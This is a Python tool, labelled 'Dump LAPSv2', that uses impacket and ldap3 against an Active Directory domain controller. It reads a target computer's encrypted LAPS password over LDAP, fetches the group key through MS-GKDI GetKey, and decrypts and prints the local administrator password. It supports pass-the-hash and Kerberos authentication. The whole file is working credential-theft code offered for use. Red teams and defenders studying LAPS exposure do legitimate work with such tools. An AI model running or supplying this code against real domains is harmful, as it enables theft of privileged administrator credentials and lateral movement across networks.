#!/usr/bin/env python
import argparse

from ldap3 import NTLM, Connection, Server
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5.epm import hept_map
from impacket.dcerpc.v5.gkdi import MSRPC_UUID_GKDI, GkdiGetKey, GroupKeyEnvelope
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.dpapi_ng import EncryptedPasswordBlob, KeyIdentifier, compute_kek, create_sd, decrypt_plaintext, unwrap_cek
from pyasn1.codec.der import decoder
from pyasn1_modules import rfc5652

class LAPSv2Extract:
    def __init__(self, dc_ip, username, password, lmhash, nthash, do_kerberos, domain, base_dn, target_computer):
        self.dc_ip = dc_ip
        self.username = username
        self.password = password
        self.lmhash = lmhash
        self.nthash = nthash
        self.do_kerberos = do_kerberos
        self.domain = domain
        self.base_dn = base_dn
        self.target_computer = target_computer

    def ldap_request(self, ldap_server, domain, username, password, base_dn, target_computer):
        data = None
        ldap_server = Server("ldap://%s" % ldap_server)
        print('[-] Connecting to %s with user %s\\%s' % (ldap_server, domain, username))
        with Connection(ldap_server, user="%s\\%s" % (domain, username), password=password, authentication=NTLM, auto_bind=True) as ldap_connection:
            print('[+] Connected! Getting msLAPS-EncryptedPassword for %s' % target_computer)
            # Define the search request
            search_filter = '(&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))(name=' + target_computer + '))'
            attributes = ['msLAPS-EncryptedPassword', 'msLAPS-Password', 'sAMAccountName']
            search_result = ldap_connection.search(search_filter=search_filter, search_base=base_dn, attributes=attributes)
            # Print the result of the search request
            if search_result:
                results = ldap_connection.response
                data = results[0]['raw_attributes']['msLAPS-EncryptedPassword'][0]
        return data

    def rpc_connect(self, username, password, domain, lmhash, nthash, doKerberos, dcHost):
        stringBinding = hept_map(destHost=dcHost, remoteIf=MSRPC_UUID_GKDI, protocol = 'ncacn_ip_tcp')

        rpctransport = transport.DCERPCTransportFactory(stringBinding)
        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)
        if doKerberos:
            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)
        if dcHost:
            rpctransport.setRemoteHost(dcHost)
        dce = rpctransport.get_dce_rpc()
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
        print("[-] Connecting to %s" % stringBinding)
        try:
            dce.connect()
        except Exception as e:
            print("Something went wrong, check error status => %s" % str(e))
            return None
        print("[+] Connected")
        print("[+] Binding to MS-GKDI")
        try:
            dce.bind(MSRPC_UUID_GKDI)
        except Exception as e:
            import traceback
            traceback.print_stack()
            print("Something went wrong, check error status => %s" % str(e))
            return None
        print("[+] Successfully bound")
        return dce

    def run(self):
        data = self.ldap_request(self.dc_ip, self.domain, self.username, self.password, self.base_dn, self.target_computer)
        if data == None:
            print("[!] No encrypted blob returned")
            return 
        
        # 2. Unpack the encrypted blob to get KeyIdentifier and all the infos
        print('[-] Unpacking blob')
        rawblob = EncryptedPasswordBlob(data)
        parsed_cms_data, remaining = decoder.decode(rawblob['Blob'], asn1Spec=rfc5652.ContentInfo())
        enveloped_data_blob = parsed_cms_data['content']
        parsed_enveloped_data, _ = decoder.decode(enveloped_data_blob, asn1Spec=rfc5652.EnvelopedData())

        recipient_infos = parsed_enveloped_data['recipientInfos']
        kek_recipient_info = recipient_infos[0]['kekri']
        kek_identifier = kek_recipient_info['kekid'] 
        key_id = KeyIdentifier(bytes(kek_identifier['keyIdentifier']))
        tmp,_ = decoder.decode(kek_identifier['other']['keyAttr'])
        sid = tmp['field-1'][0][0][1].asOctets().decode("utf-8") 
        target_sd = create_sd(sid)

        # 3. Connect on RPC over TCP to MS-GKDI to call opnum 0 GetKey 
        dce = self.rpc_connect(username=self.username, password=self.password, domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, doKerberos=self.do_kerberos, dcHost=self.dc_ip)
        if dce is None:
            return
        print("[-] Calling MS-GKDI GetKey")
        resp = GkdiGetKey(dce, target_sd=target_sd, l0=key_id['L0Index'], l1=key_id['L1Index'], l2=key_id['L2Index'], root_key_id=key_id['RootKeyId'])
        print("[-] Decrypting password")
        # 4. Unpack GroupKeyEnvelope
        gke = GroupKeyEnvelope(b''.join(resp['pbbOut']))

        kek = compute_kek(gke, key_id)

        enc_content_parameter = bytes(parsed_enveloped_data["encryptedContentInfo"]["contentEncryptionAlgorithm"]["parameters"])
        iv, _ = decoder.decode(enc_content_parameter)
        iv = bytes(iv[0])

        cek = unwrap_cek(kek, bytes(kek_recipient_info['encryptedKey']))

        plaintext = decrypt_plaintext(cek, iv, remaining)
        print(plaintext[:-18].decode('utf-16le'))

def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Dump LAPSv2")
    parser.add_argument('-u', '--username', action="store", default='', help='valid username')
    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')
    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')
    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')
    
    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-target-computer', action="store", default='', help='Computer that you want the laps admin password')
    parser.add_argument('-base-dn', action="store", default='', help='Base DN')

    options = parser.parse_args()

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password == '' and options.username != '' and options.hashes is None and options.no_pass is not True:
        from getpass import getpass
        options.password = getpass("Password:")
    
    lapsv2extract = LAPSv2Extract(options.dc_ip, options.username, options.password, lmhash, nthash, options.k, options.domain, options.base_dn, options.target_computer)
    lapsv2extract.run()

    # # 6. Unwrap CEK
    # print('[-] Unwraping CEK')
    # cek = keywrap.aes_key_unwrap(kek, bytes(kek_recipient_info['encryptedKey']))
    # print(cek)
    

    # # 7. Decrypt the encrypted content with CEK
    # cipher = AESGCM(cek)
    # output = cipher.decrypt(bytes(iv[0]), remaining, None)
    # print()
    # print(output.decode('utf-16le'))

if __name__ == "__main__":
    main()